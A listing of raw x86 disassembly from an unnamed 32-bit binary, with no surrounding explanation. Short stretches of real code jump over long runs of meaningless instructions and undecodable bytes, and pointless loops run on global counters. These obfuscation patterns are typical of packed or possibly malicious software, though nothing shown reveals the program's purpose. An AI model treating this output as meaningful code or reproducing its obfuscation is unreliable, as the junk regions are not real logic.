  40e8b2:	jae    0x40e8fe
  40e8b8:	cmp    DWORD PTR ds:0x42fcd1,0x8
  40e8bf:	jne    0x40e8d0
  40e8c5:	push   0x42e1e7
  40e8ca:	call   DWORD PTR ds:0x42e47f
  40e8d0:	cmp    DWORD PTR ds:0x42fcd1,0x7
  40e8d7:	jne    0x40e8ec
  40e8dd:	xor    ecx,ecx
  40e8df:	add    ecx,DWORD PTR ds:0x42fcd1
  40e8e5:	inc    ecx
  40e8e6:	mov    DWORD PTR ds:0x42fcd1,ecx
  40e8ec:	jmp    0x40e89e
  40e8f1:	movzx  ecx,BYTE PTR ds:0x42fd8a
  40e8f8:	adc    DWORD PTR ds:0x42e6ff,ecx
  40e8fe:	mov    eax,DWORD PTR [ebp+0x8]
  40e901:	xor    DWORD PTR ds:0x42e6f7,0x70e3
  40e90b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40e90e:	and    DWORD PTR ds:0x42e6fb,0x42e6ef
  40e918:	xor    eax,esi
  40e91a:	not    DWORD PTR ds:0x42fd01
  40e920:	add    eax,edi
  40e922:	mov    DWORD PTR ds:0x42fd0d,0x37d2
  40e92c:	cmp    DWORD PTR [ecx],eax
  40e92e:	mov    DWORD PTR ds:0x42e70b,0x263d
  40e938:	jmp    0x40eaa2
  40e93d:	(bad)  
  40e93e:	(bad)  
  40e93f:	fistp  DWORD PTR [ebx+0x65445961]
  40e945:	shl    BYTE PTR [edi-0x39],0x63
  40e949:	frstpm(287 only) 
  40e94b:	push   es
  40e94c:	mov    edi,0x7070a024
  40e951:	ret    
  40e952:	jg     0x40e9c4
  40e954:	jo     0x40e8f3
  40e956:	or     eax,0xf0c49b5e
  40e95b:	mov    ch,0xdc
  40e95d:	pusha  
  40e95e:	mov    ah,0x35
  40e960:	xchg   esp,eax
  40e961:	xor    ebp,DWORD PTR [edx+0x26]
  40e964:	or     BYTE PTR [ecx+eiz*8-0x344a555b],ch
  40e96b:	sbb    dh,0x48
  40e96e:	stos   DWORD PTR es:[edi],eax
  40e96f:	inc    esi
  40e970:	js     0x40e9bd
  40e972:	into   
  40e973:	ret    
  40e974:	mov    ah,0x20
  40e976:	jge    0x40e988
  40e978:	es cld 
  40e97a:	pop    esi
  40e97b:	push   edx
  40e97c:	and    edx,DWORD PTR [eax-0x69]
  40e97f:	cli    
  40e980:	mov    edx,0x1a17287d
  40e985:	fistp  DWORD PTR [ecx]
  40e987:	pushf  
  40e988:	jnp    0x40e953
  40e98a:	stc    
  40e98b:	xor    ebx,DWORD PTR ds:0x66384f48
  40e991:	fistp  QWORD PTR [ebx+0x35509377]
  40e997:	popa   
  40e998:	xor    BYTE PTR [esi+0x70],ah
  40e99b:	add    cl,BYTE PTR [ebp-0xf166954]
  40e9a1:	loopne 0x40e9b6
  40e9a3:	pop    es
  40e9a4:	adc    eax,0xd1dd5452
  40e9a9:	mov    ebx,0xa079f0e
  40e9ae:	js     0x40ea08
  40e9b0:	je     0x40e955
  40e9b2:	inc    esp
  40e9b3:	mov    al,dl
  40e9b5:	leave  
  40e9b6:	out    0xa0,al
  40e9b8:	pop    ebp
  40e9b9:	(bad)  
  40e9ba:	xlat   BYTE PTR ds:[ebx]
  40e9bb:	stos   BYTE PTR es:[edi],al
  40e9bc:	daa    
  40e9bd:	mov    eax,0x40115759
  40e9c2:	cdq    
  40e9c3:	fst    st(1)
  40e9c5:	pushf  
  40e9c6:	gs shl ebx,1
  40e9c9:	push   0x79973e39
  40e9ce:	and    ebx,DWORD PTR [eax]
  40e9d0:	loop   0x40ea32
  40e9d2:	or     dl,al
  40e9d4:	bound  ecx,QWORD PTR [edi-0x44b37e5e]
  40e9da:	push   edx
  40e9db:	sub    BYTE PTR [edi-0x4e3313c],0x79
  40e9e2:	sbb    al,0xef
  40e9e4:	mov    ch,0xe5
  40e9e6:	jo     0x40e9f0
  40e9e8:	pop    ds
  40e9e9:	cmc    
  40e9ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9eb:	jne    0x40e97a
  40e9ed:	mov    dl,0x17
  40e9ef:	adc    bh,dl
  40e9f1:	jb     0x40e989
  40e9f3:	and    BYTE PTR [ecx],al
  40e9f5:	or     eax,0xe52d99eb
  40e9fa:	or     DWORD PTR [ebx+ecx*8+0x73],esi
  40e9fe:	or     al,0x98
  40ea00:	iret   
  40ea01:	inc    ebx
  40ea02:	or     ch,cl
  40ea04:	and    ch,BYTE PTR [edx]
  40ea06:	or     BYTE PTR [eax],0xcb
  40ea09:	cmp    bl,BYTE PTR [edx-0x75a447f5]
  40ea0f:	outs   dx,DWORD PTR ds:[esi]
  40ea10:	sbb    edx,ebx
  40ea12:	push   cs
  40ea13:	retf   
  40ea14:	cwde   
  40ea15:	loop   0x40ea3e
  40ea17:	sub    BYTE PTR [edx+0x13],ch
  40ea1a:	retf   
  40ea1b:	dec    edi
  40ea1c:	popa   
  40ea1d:	ss adc esi,ecx
  40ea20:	cmp    BYTE PTR [edx-0x56],ch
  40ea23:	push   es
  40ea24:	inc    ecx
  40ea25:	adc    eax,0xb7b4bc6a
  40ea2a:	push   ecx
  40ea2b:	mov    ch,0x2e
  40ea2d:	sbb    al,0x1
  40ea2f:	call   0xbbba:0xa28dbe63
  40ea36:	iret   
  40ea37:	shl    BYTE PTR [edx],0x90
  40ea3a:	pop    edx
  40ea3b:	cdq    
  40ea3c:	dec    ecx
  40ea3d:	mov    dl,0x1c
  40ea3f:	nop
  40ea40:	pop    ebx
  40ea41:	nop
  40ea42:	push   0xd70e1c88
  40ea47:	cmp    al,0x55
  40ea49:	push   edx
  40ea4a:	lds    esi,FWORD PTR [esi+0x23]
  40ea4d:	sar    BYTE PTR [eax+edx*4],0xf8
  40ea51:	xor    DWORD PTR [ecx-0x33],edx
  40ea54:	xor    al,0x18
  40ea56:	shr    DWORD PTR [eax],cl
  40ea58:	cmp    DWORD PTR [edi+0x4ed9f647],esp
  40ea5e:	adc    eax,0xbf79ca2b
  40ea64:	outs   dx,BYTE PTR ds:[esi]
  40ea65:	sbb    al,0x96
  40ea67:	addr16 in al,dx
  40ea69:	push   eax
  40ea6a:	jb     0x40ea50
  40ea6c:	cmp    ebp,DWORD PTR [ecx]
  40ea6e:	(bad)  
  40ea6f:	jmp    0x888ee769
  40ea74:	xor    al,0x19
  40ea76:	push   ebx
  40ea77:	cmp    DWORD PTR [ebx],edx
  40ea79:	sbb    ebx,ecx
  40ea7b:	jne    0x40eaa4
  40ea7d:	or     BYTE PTR [ebx],0xb2
  40ea80:	xor    DWORD PTR [eax-0x5ef77a81],ecx
  40ea86:	test   BYTE PTR [edi],0x1a
  40ea89:	mov    dl,0x32
  40ea8b:	stos   DWORD PTR es:[edi],eax
  40ea8c:	rcl    BYTE PTR [ecx],cl
  40ea8e:	je     0x40ea11
  40ea90:	cmp    BYTE PTR [edx+0x20],0x82
  40ea94:	js     0x40ea56
  40ea96:	out    dx,eax
  40ea97:	add    eax,0x3378bf6b
  40ea9d:	mov    bl,BYTE PTR [ebx]
  40ea9f:	pop    ecx
  40eaa0:	iret   
  40eaa1:	xor    eax,0xa6850f
  40eaa6:	add    BYTE PTR [eax],al
  40eaa8:	add    ecx,edx
  40eaaa:	mov    eax,DWORD PTR [ebp+0x8]
  40eaad:	sbb    ecx,0x443c
  40eab3:	mov    ecx,DWORD PTR [ebp-0x10]
  40eab6:	adc    edx,DWORD PTR ds:0x42fce5
  40eabc:	xor    eax,esi
  40eabe:	add    eax,edi
  40eac0:	mov    DWORD PTR [ecx],eax
  40eac2:	sbb    ecx,0x77dc
  40eac8:	mov    eax,DWORD PTR [ebp-0x10]
  40eacb:	adc    ecx,0x4d7b
  40ead1:	mov    ecx,DWORD PTR [ebp-0x14]
  40ead4:	mov    DWORD PTR ds:0x42e128,0x11
  40eade:	cmp    DWORD PTR ds:0x42e128,0x0
  40eae5:	je     0x40eb43
  40eaeb:	cmp    DWORD PTR ds:0x42e128,0x2
  40eaf2:	jne    0x40eb15
  40eaf8:	push   0x42e130
  40eafd:	push   0x42e16f
  40eb02:	push   0x1c20
  40eb07:	push   DWORD PTR [ebp-0x10]
  40eb0a:	push   0x848e
  40eb0f:	call   DWORD PTR ds:0x42e30f
  40eb15:	cmp    DWORD PTR ds:0x42e128,0x3
  40eb1c:	jne    0x40eb31
  40eb22:	xor    edx,edx
  40eb24:	or     edx,DWORD PTR ds:0x42e128
  40eb2a:	dec    edx
  40eb2b:	mov    DWORD PTR ds:0x42e128,edx
  40eb31:	mov    edx,DWORD PTR ds:0x42e128
  40eb37:	dec    edx
  40eb38:	mov    DWORD PTR ds:0x42e128,edx
  40eb3e:	jmp    0x40eade
  40eb43:	xor    ecx,esi
  40eb45:	mov    edx,0xffcd8d64
  40eb4a:	sub    edx,ecx
  40eb4c:	add    DWORD PTR [eax],edx
  40eb4e:	mov    eax,ds:0x41b27c
  40eb53:	mov    eax,DWORD PTR [eax]
  40eb55:	mov    cx,WORD PTR [ebp-0x4]
  40eb59:	movzx  ecx,cx
  40eb5c:	add    ecx,DWORD PTR [eax]
  40eb5e:	mov    DWORD PTR [ebp-0x1c],ecx
  40eb61:	mov    eax,DWORD PTR [ebp+0xc]
  40eb64:	mov    ecx,DWORD PTR [ebp+0xc]
  40eb67:	xor    eax,esi
  40eb69:	lea    eax,[eax+eax*1+0x32729c]
  40eb70:	xor    ecx,esi
  40eb72:	sub    ecx,eax
  40eb74:	mov    ax,WORD PTR [ebp-0x4]
  40eb78:	movzx  eax,ax
  40eb7b:	jmp    0x40ece5
  40eb80:	or     BYTE PTR [edi],dl
  40eb82:	shr    BYTE PTR [edx-0x31],0x71
  40eb86:	mov    dl,0x71
  40eb88:	inc    eax
  40eb89:	(bad)  
  40eb8a:	pop    esp
  40eb8b:	mov    ch,0xf5
  40eb8d:	xchg   ebp,eax
  40eb8e:	inc    esi
  40eb8f:	jb     0x40eb88
  40eb91:	scas   eax,DWORD PTR es:[edi]
  40eb92:	jo     0x40ec04
  40eb94:	ret    
  40eb95:	jg     0x40ec07
  40eb97:	jo     0x40ec0e
  40eb99:	push   fs
  40eb9b:	inc    ebx
  40eb9c:	jecxz  0x40ec10
  40eb9e:	jmp    0x40eba2
  40eba0:	test   BYTE PTR [ebp+0x412136fc],dh
  40eba6:	lahf   
  40eba7:	icebp  
  40eba8:	jne    0x40eb41
  40ebaa:	sbb    DWORD PTR [eax-0x6d],edx
  40ebad:	xor    DWORD PTR [edi-0x692773f9],0xffffffd0
  40ebb4:	mov    ebx,0x1fee8b83
  40ebb9:	jmp    DWORD PTR ds:0x42d66ea1
  40ebbf:	jge    0x40ec40
  40ebc1:	dec    ebp
  40ebc2:	and    BYTE PTR [ecx+0x66],bh
  40ebc5:	and    eax,0xbcfefa48
  40ebca:	repz xor eax,0x448df6ab
  40ebd0:	sub    cl,BYTE PTR [edi-0x5a]
  40ebd3:	outs   dx,BYTE PTR ds:[esi]
  40ebd4:	aas    
  40ebd5:	sub    al,0x17
  40ebd7:	push   esi
  40ebd8:	push   ebp
  40ebd9:	pop    ecx
  40ebda:	dec    edi
  40ebdb:	cs mov esp,0x248eae1b
  40ebe1:	in     eax,0x26
  40ebe3:	jb     0x40ebac
  40ebe5:	lahf   
  40ebe6:	mov    DWORD PTR [eax+0x61a9fe23],edx
  40ebec:	adc    esp,DWORD PTR ss:[edi+0x3f]
  40ebf0:	ficomp DWORD PTR [edx-0x5a]
  40ebf3:	popf   
  40ebf4:	mov    eax,ecx
  40ebf6:	in     eax,dx
  40ebf7:	mov    edx,0xf350fd80
  40ebfc:	xchg   edx,eax
  40ebfd:	out    0xd2,al
  40ebff:	scas   eax,DWORD PTR es:[edi]
  40ec00:	mov    ecx,0x333953f
  40ec05:	enter  0xed0d,0xd6
  40ec09:	push   ecx
  40ec0a:	lods   al,BYTE PTR ds:[esi]
  40ec0b:	jne    0x40ebf6
  40ec0d:	fwait
  40ec0e:	lods   al,BYTE PTR ds:[esi]
  40ec0f:	add    BYTE PTR [edi+eiz*1-0x63fc85e9],dh
  40ec16:	pop    edi
  40ec17:	xor    eax,0xc8a52d0f
  40ec1c:	mov    dl,0x5f
  40ec1e:	stos   DWORD PTR es:[edi],eax
  40ec1f:	stc    
  40ec20:	lahf   
  40ec21:	cdq    
  40ec22:	call   0xe600:0xcfc34a19
  40ec29:	rol    dl,cl
  40ec2b:	xchg   edx,eax
  40ec2c:	loopne 0x40ec10
  40ec2e:	sahf   
  40ec2f:	push   ecx
  40ec30:	xchg   eax,esi
  40ec32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec33:	fnstcw WORD PTR [ecx+0x266778d2]
  40ec39:	mov    edi,0x7cf71a7a
  40ec3e:	jb     0x40ecbd
  40ec40:	push   edx
  40ec41:	enterw 0xf0b1,0x30
  40ec46:	pop    ecx
  40ec47:	mul    DWORD PTR [edx]
  40ec49:	mov    cl,0x8d
  40ec4b:	xor    al,0xfd
  40ec4d:	push   cs
  40ec4e:	ss cs xchg edi,eax
  40ec51:	xchg   BYTE PTR [eax-0x4eb47668],bh
  40ec57:	imul   edi,esp,0x42
  40ec5a:	mov    edi,0xda63180
  40ec5f:	(bad)  
  40ec60:	repnz dec ebx
  40ec62:	push   ecx
  40ec63:	popf   
  40ec64:	std    
  40ec65:	mov    al,0xff
  40ec67:	adc    DWORD PTR [ebp+0x3dfbcac7],eax
  40ec6d:	and    ebp,ebx
  40ec6f:	cwde   
  40ec70:	xor    cl,BYTE PTR [edi*2+0x5856a6f7]
  40ec77:	xchg   DWORD PTR [edi+edx*2+0x38],ebp
  40ec7b:	adc    ebp,esi
  40ec7d:	and    al,0x1c
  40ec7f:	stc    
  40ec80:	(bad)  
  40ec82:	ror    DWORD PTR [edi+0x1d],0x8b
  40ec86:	xchg   esp,eax
  40ec87:	fbld   TBYTE PTR [edi-0x5ce8842c]
  40ec8d:	push   ebx
  40ec8e:	(bad)  
  40ec8f:	cld    
  40ec90:	mov    cs,WORD PTR [edi+ebx*1-0x60b94caa]
  40ec97:	jb     0x40ecd9
  40ec99:	retf   
  40ec9a:	dec    edx
  40ec9b:	pop    es
  40ec9c:	test   BYTE PTR [edi+esi*2],ch
  40ec9f:	aam    0x63
  40eca1:	push   es
  40eca2:	in     eax,0x9b
  40eca4:	dec    ecx
  40eca5:	pop    ecx
  40eca6:	or     BYTE PTR [esi],dl
  40eca8:	gs jb  0x40ece7
  40ecab:	mov    ebp,0x362e3527
  40ecb0:	test   BYTE PTR [eax],bl
  40ecb2:	scas   al,BYTE PTR es:[edi]
  40ecb3:	and    bl,BYTE PTR ds:0xe86b02ec
  40ecb9:	fwait
  40ecba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ecbb:	mov    esi,0xe9c132ef
  40ecc0:	pop    edx
  40ecc1:	pop    DWORD PTR [ecx+edi*4-0x58]
  40ecc5:	and    bl,0xeb
  40ecc8:	mov    al,0xe0
  40ecca:	xchg   ecx,eax
  40eccb:	mov    bl,0xc9
  40eccd:	xor    eax,0xe7198a51
  40ecd2:	(bad)  
  40ecd3:	fnsave [eax]
  40ecd5:	rol    DWORD PTR [esi-0x4562936d],1
  40ecdb:	pop    edi
  40ecdc:	sbb    bh,dl
  40ecde:	dec    edx
  40ecdf:	cmc    
  40ece0:	popa   
  40ece1:	adc    bl,BYTE PTR [esi-0x3ec439cb]
  40ece7:	mov    eax,DWORD PTR [ebp-0x14]
  40ecea:	movzx  ecx,WORD PTR [ebp-0x4]
  40ecee:	jmp    0x40ee58
  40ecf3:	movntps XMMWORD PTR [edi+edi*8+0x64],xmm4
  40ecf8:	push   edi
  40ecf9:	rep stos DWORD PTR es:[edi],eax
  40ecfb:	mov    dh,0x81
  40ecfd:	push   ebx
  40ecfe:	jle    0x40ecc0
  40ed00:	pop    edx
  40ed01:	adc    al,0x1f
  40ed03:	mov    edx,0xc37070ae
  40ed08:	jg     0x40ed7a
  40ed0a:	jo     0x40ecda
  40ed0c:	dec    esi
  40ed0d:	push   edx
  40ed0e:	das    
  40ed0f:	sbb    eax,0xa82e031f
  40ed14:	jmp    0x40ecb3
  40ed16:	fiadd  DWORD PTR [ebx+ebx*2-0x52]
  40ed1a:	js     0x40ed8c
  40ed1c:	shl    ecx,0x58
  40ed1f:	push   esi
  40ed20:	test   eax,0xed84d0ab
  40ed25:	test   al,0xd3
  40ed27:	(bad)  
  40ed28:	leave  
  40ed29:	xchg   ebx,eax
  40ed2a:	sub    eax,0xe23efcaf
  40ed2f:	aam    0xba
  40ed31:	pushf  
  40ed32:	cmp    DWORD PTR [edx+0x61],ebp
  40ed35:	jp     0x40ed21
  40ed37:	mov    DWORD PTR [eax-0x60e91967],eax
  40ed3d:	ret    
  40ed3e:	xor    eax,0x645bbc9
  40ed43:	jo     0x40ed05
  40ed45:	jge    0x40ed77
  40ed47:	data16 into 
  40ed49:	psubw  mm3,mm2
  40ed4c:	daa    
  40ed4d:	scas   eax,DWORD PTR es:[edi]
  40ed4e:	(bad)  
  40ed4f:	icebp  
  40ed50:	mov    ds:0x903d3fb4,eax
  40ed55:	(bad)  
  40ed56:	popf   
  40ed57:	cmp    DWORD PTR [eax+edi*2],edx
  40ed5a:	xor    ebx,ebp
  40ed5c:	xor    ch,BYTE PTR [esp+ebp*2]
  40ed5f:	mov    ch,0x53
  40ed61:	dec    ebp
  40ed62:	jnp    0x40edaf
  40ed64:	pop    eax
  40ed65:	es call 0x4f3415be
  40ed6b:	inc    ebp
  40ed6c:	mov    ch,BYTE PTR [ebx+0x68]
  40ed6f:	pushf  
  40ed70:	mov    cl,0x4d
  40ed72:	loope  0x40ed75
  40ed74:	rol    BYTE PTR [eax+0x5c2942c3],1
  40ed7a:	cmc    
  40ed7b:	scas   eax,DWORD PTR es:[edi]
  40ed7c:	adc    BYTE PTR [edi-0x17ff2ddf],dh
  40ed82:	clc    
  40ed83:	dec    ebx
  40ed84:	test   BYTE PTR [ebp-0x4db7f944],0x5d
  40ed8b:	dec    esi
  40ed8c:	iret   
  40ed8d:	or     dl,BYTE PTR [edx-0x2f5e3a23]
  40ed93:	popa   
  40ed94:	fdivp  st(2),st
  40ed96:	icebp  
  40ed97:	jmp    0x1737:0x9eab54cc
  40ed9e:	shl    DWORD PTR [eax],0x99
  40eda1:	xchg   edx,eax
  40eda2:	pushf  
  40eda3:	ret    0x8b03
  40eda6:	add    DWORD PTR [edx+0xf],edi
  40eda9:	pop    ebp
  40edaa:	inc    ebx
  40edab:	daa    
  40edac:	and    eax,0x1786f0a4
  40edb1:	loopne 0x40ee17
  40edb3:	mov    bl,0x12
  40edb5:	push   edi
  40edb6:	popa   
  40edb7:	mov    bl,0x9e
  40edb9:	arpl   WORD PTR [esi+0x24af855e],bx
  40edbf:	lds    ebp,FWORD PTR [edx]
  40edc1:	and    DWORD PTR [ebx-0x1e],esp
  40edc4:	xchg   edx,eax
  40edc5:	or     DWORD PTR [edi+0x9],esp
  40edc8:	mov    ds:0xeb8b901a,al
  40edcd:	int3   
  40edce:	add    al,BYTE PTR [edx-0x36291e70]
  40edd4:	mov    al,0x32
  40edd6:	mov    dl,0x59
  40edd8:	jno    0x40edc2
  40edda:	mov    edx,es
  40eddc:	mov    ebx,0xfe85920
  40ede1:	sub    eax,0x1e0fce25
  40ede6:	push   edx
  40ede7:	imul   ebp,DWORD PTR [eax],0xffffffcc
  40edea:	adc    bh,ch
  40edec:	sub    dh,BYTE PTR [edx-0x1d]
  40edef:	rcr    DWORD PTR [edi+0x6f],0x8a
  40edf3:	adc    eax,0xa99faedb
  40edf8:	cmp    BYTE PTR cs:[eax-0x7f],cl
  40edfc:	hlt    
  40edfd:	rcr    BYTE PTR [edi-0xb419fc7],1
  40ee03:	nop
  40ee04:	out    dx,eax
  40ee05:	test   BYTE PTR [eax],ch
  40ee07:	or     cl,BYTE PTR [ebp-0x6a38681c]
  40ee0d:	pop    ebp
  40ee0e:	mov    ecx,0xc04877ad
  40ee14:	fwait
  40ee15:	sub    eax,0xe4fad51b
  40ee1a:	test   eax,0x934091db
  40ee1f:	jne    0x40ee08
  40ee21:	imul   edi,DWORD PTR [esi],0x62
  40ee24:	outs   dx,BYTE PTR ds:[esi]
  40ee25:	jl     0x40ee6f
  40ee27:	das    
  40ee28:	addr16 addr16 push ecx
  40ee2b:	shl    bl,cl
  40ee2d:	cmp    edx,DWORD PTR [eax+0x26]
  40ee30:	mov    bh,bl
  40ee32:	push   ds
  40ee33:	jmp    0x285958a1
  40ee38:	push   esp
  40ee39:	iret   
  40ee3a:	mov    dh,0xe0
  40ee3c:	mov    eax,0x284b6f3d
  40ee41:	pop    ss
  40ee42:	add    bl,dh
  40ee44:	cmp    bl,BYTE PTR [edx-0x5e]
  40ee47:	outs   dx,DWORD PTR ds:[esi]
  40ee48:	push   ss
  40ee49:	and    ecx,DWORD PTR [ecx+0x76]
  40ee4c:	sar    dh,1
  40ee4e:	mov    al,ds:0x174ab177
  40ee53:	push   ss
  40ee54:	gs (bad) 
  40ee56:	stc    
  40ee57:	popa   
  40ee58:	jg     0x40efd7
  40ee5e:	xor    eax,esi
  40ee60:	sub    ecx,eax
  40ee62:	sub    ecx,edi
  40ee64:	mov    WORD PTR [ebp-0x4],cx
  40ee68:	jmp    0x40efe4
  40ee6d:	jmp    0x40efd7
  40ee72:	int3   
  40ee73:	push   ebp
  40ee74:	(bad)  
  40ee75:	icebp  
  40ee76:	xchg   ecx,eax
  40ee77:	icebp  
  40ee78:	je     0x40eeef
  40ee7a:	in     al,0x65
  40ee7c:	pop    edx
  40ee7d:	mov    cl,0x97
  40ee7f:	xchg   ebp,eax
  40ee80:	repz or al,0xd
  40ee83:	lods   al,BYTE PTR ds:[esi]
  40ee84:	jo     0x40eef6
  40ee86:	ret    
  40ee87:	jg     0x40eef9
  40ee89:	jo     0x40eebe
  40ee8b:	stc    
  40ee8c:	mov    cl,0xd7
  40ee8e:	push   edx
  40ee8f:	sub    al,0x74
  40ee91:	mov    ds:0x37a7e9d9,al
  40ee96:	jl     0x40ef09
  40ee98:	ds pop eax
  40ee9a:	outs   dx,DWORD PTR ds:[esi]
  40ee9b:	xor    esp,0xf9b9a11e
  40eea1:	retf   
  40eea2:	ror    BYTE PTR [eax+0x17a89171],cl
  40eea8:	frstor [ebp+0x5]
  40eeab:	push   eax
  40eeac:	cmp    BYTE PTR [ecx+edx*4-0x1ac8a329],ch
  40eeb3:	mov    edx,0x47d62aaa
  40eeb8:	adc    BYTE PTR [edx],dh
  40eeba:	std    
  40eebb:	ja     0x40ee4e
  40eebd:	test   DWORD PTR [eax],eax
  40eebf:	jns    0x40eeda
  40eec1:	in     eax,dx
  40eec2:	les    edx,FWORD PTR [edx]
  40eec4:	into   
  40eec5:	sub    ah,al
  40eec7:	les    ecx,FWORD PTR [edx-0x7f]
  40eeca:	pop    ebp
  40eecb:	js     0xa2e6c35a
  40eed1:	mov    edi,0x502c7d
  40eed6:	fdiv   DWORD PTR ds:[ecx]
  40eed9:	popa   
  40eeda:	and    eax,0xece8c0b6
  40eedf:	xlat   BYTE PTR ds:[ebx]
  40eee0:	mov    dh,0x8c
  40eee2:	dec    edx
  40eee3:	mov    ds:0xe3277edb,eax
  40eee8:	loop   0x40ef5b
  40eeea:	or     eax,0x1a98faf0
  40eeef:	das    
  40eef0:	sqrtps xmm7,XMMWORD PTR [edx-0x1e1f6d21]
  40eef7:	(bad)  
  40eef8:	iret   
  40eef9:	cwde   
  40eefa:	addr16 cdq 
  40eefc:	sbb    DWORD PTR [ecx+0x6a],esp
  40eeff:	and    dh,ch
  40ef01:	pop    eax
  40ef02:	out    dx,eax
  40ef03:	jl     0x40ef7d
  40ef05:	rol    ah,cl
  40ef07:	or     al,0xe
  40ef09:	mov    esp,0xa958549a
  40ef0e:	mov    ecx,0xaf32ce96
  40ef13:	mov    ds:0x1edb358a,eax
  40ef18:	aaa    
  40ef19:	xchg   DWORD PTR [edx+0x19],ecx
  40ef1c:	dec    ecx
  40ef1d:	(bad)  
  40ef1e:	mov    esp,0x51f06165
  40ef23:	or     DWORD PTR [ecx-0x3d498e22],ebp
  40ef29:	pop    esi
  40ef2a:	xor    edi,DWORD PTR [esi+0x19395734]
  40ef30:	cmp    al,0x7b
  40ef32:	cmp    DWORD PTR [eax+edx*4+0x6c375b94],eax
  40ef39:	push   0xe51b1faa
  40ef3e:	nop
  40ef3f:	(bad)  
  40ef40:	and    DWORD PTR [esi+0x42cd582c],esp
  40ef46:	ss pop edi
  40ef48:	call   0xf1f5e631
  40ef4d:	xor    ecx,esi
  40ef4f:	out    dx,al
  40ef50:	pusha  
  40ef51:	dec    eax
  40ef52:	or     DWORD PTR [esi+0x4f],ecx
  40ef55:	lods   al,BYTE PTR ds:[esi]
  40ef56:	retf   
  40ef57:	outs   dx,BYTE PTR ds:[esi]
  40ef58:	fs adc cl,bh
  40ef5b:	dec    esi
  40ef5c:	add    al,0x25
  40ef5e:	iret   
  40ef5f:	xor    ch,BYTE PTR [esi]
  40ef61:	mov    BYTE PTR [edx+0x62],ch
  40ef64:	add    DWORD PTR [edi-0x47],ebx
  40ef67:	push   edx
  40ef68:	in     eax,0xce
  40ef6a:	push   0xfffffffb
  40ef6c:	fistp  DWORD PTR [edx+0x4b]
  40ef6f:	push   es
  40ef70:	jnp    0x40ef43
  40ef72:	dec    eax
  40ef73:	dec    esi
  40ef74:	idiv   BYTE PTR [ecx+0x2094f9d0]
  40ef7a:	adc    bh,BYTE PTR [ebx-0x6c580f6a]
  40ef80:	or     eax,0x549dbce9
  40ef85:	mov    al,0x37
  40ef87:	and    al,0xff
  40ef89:	mov    esi,0xcd23e594
  40ef8e:	mov    eax,0x90247cb5
  40ef93:	popf   
  40ef94:	xchg   edx,eax
  40ef95:	ret    0x135d
  40ef98:	jno    0x40ef1e
  40ef9a:	fwait
  40ef9b:	outs   dx,DWORD PTR ds:[esi]
  40ef9c:	mov    edx,ebp
  40ef9e:	sub    al,0xc6
  40efa0:	sbb    DWORD PTR [edi+0x7],eax
  40efa3:	mov    ah,0x6
  40efa5:	cmp    BYTE PTR [ecx+0x79ad5aed],0xae
  40efac:	jb     0x40ef4f
  40efae:	add    esp,DWORD PTR [edi-0x6dd10ce9]
  40efb4:	pusha  
  40efb5:	pop    eax
  40efb6:	mov    ecx,0x656f5989
  40efbb:	call   FWORD PTR [edx+0x5f]
  40efbe:	push   ss
  40efbf:	(bad)  
  40efc0:	iret   
  40efc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efc2:	sub    BYTE PTR [esi-0x587e862e],0x8a
  40efc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efca:	add    DWORD PTR [esi+0x77],edi
  40efcd:	rcl    DWORD PTR [eax-0x80],0x3b
  40efd1:	mov    ch,0x80
  40efd3:	stos   DWORD PTR es:[edi],eax
  40efd4:	(bad)  
  40efd5:	test   edx,ecx
  40efd7:	xor    eax,esi
  40efd9:	lea    eax,[eax+ecx*1+0x32729c]
  40efe0:	mov    WORD PTR [ebp-0x4],ax
  40efe4:	mov    eax,DWORD PTR [ebp-0xc]
  40efe7:	cmp    eax,ebx
  40efe9:	jmp    0x40f153
  40efee:	mov    cs,WORD PTR [ebx]
  40eff0:	enter  0x51c7,0xc3
  40eff4:	lea    edx,[ecx+0x2a]
  40eff7:	leave  
  40eff8:	inc    esi
  40eff9:	inc    ebx
  40effa:	cld    
  40effb:	and    eax,0xabd0c761
  40f000:	jo     0x40f072
  40f002:	ret    
  40f003:	jg     0x40f075
  40f005:	jo     0x40f035
  40f007:	inc    esi
  40f008:	xchg   esi,eax
  40f009:	iret   
  40f00a:	mov    dh,0x4f
  40f00c:	ficomp WORD PTR [ebp-0x75]
  40f00f:	cmp    eax,0x76b0a99a
  40f014:	and    al,0xce
  40f016:	inc    esp
  40f017:	aad    0x1c
  40f019:	aad    0x47
  40f01b:	adc    DWORD PTR [esi+0x60],esp
  40f01e:	sub    BYTE PTR [esi],0x3
  40f021:	mov    ah,0x14
  40f023:	into   
  40f024:	jae    0x40efb5
  40f026:	dec    cx
  40f028:	icebp  
  40f029:	push   ds
  40f02a:	jg     0x40f05d
  40f02c:	xor    BYTE PTR [esi+0x6003af2b],bh
  40f032:	cdq    
  40f033:	and    ebx,ecx
  40f035:	arpl   WORD PTR [ebx+0x12],cx
  40f038:	xchg   ebx,eax
  40f039:	mov    dh,0xc0
  40f03b:	push   ds
  40f03c:	push   ds
  40f03d:	pop    ss
  40f03e:	ja     0x40f079
  40f040:	xchg   edx,eax
  40f041:	xchg   DWORD PTR [esi-0x34],edx
  40f044:	lods   eax,DWORD PTR ds:[esi]
  40f045:	pop    ds
  40f046:	imul   esp,DWORD PTR [edx+ebp*1+0x33a75dd9],0x1b
  40f04e:	bound  ebx,QWORD PTR [ebx-0x306e4cc5]
  40f054:	push   ss
  40f055:	cmc    
  40f056:	xor    al,0x8c
  40f058:	idiv   BYTE PTR [esi+0x1c]
  40f05b:	loope  0x40f0cf
  40f05d:	mov    esp,0xaf419280
  40f062:	aam    0xc8
  40f064:	xchg   esi,eax
  40f065:	xchg   esp,eax
  40f066:	and    DWORD PTR [ebx],edi
  40f068:	outs   dx,DWORD PTR ds:[esi]
  40f069:	scas   al,BYTE PTR es:[edi]
  40f06a:	xchg   ecx,eax
  40f06b:	push   edi
  40f06c:	and    DWORD PTR [ecx],0xfffffffa
  40f06f:	ins    DWORD PTR es:[edi],dx
  40f070:	cs push 0x71b7bf40
  40f076:	cwde   
  40f077:	xor    al,BYTE PTR [esi]
  40f079:	xor    BYTE PTR [edx-0x31e49c3],bh
  40f07f:	fisubr DWORD PTR [edx+0x37]
  40f082:	(bad)  
  40f083:	push   ebp
  40f084:	xchg   ebp,eax
  40f085:	add    eax,0x2d8b5280
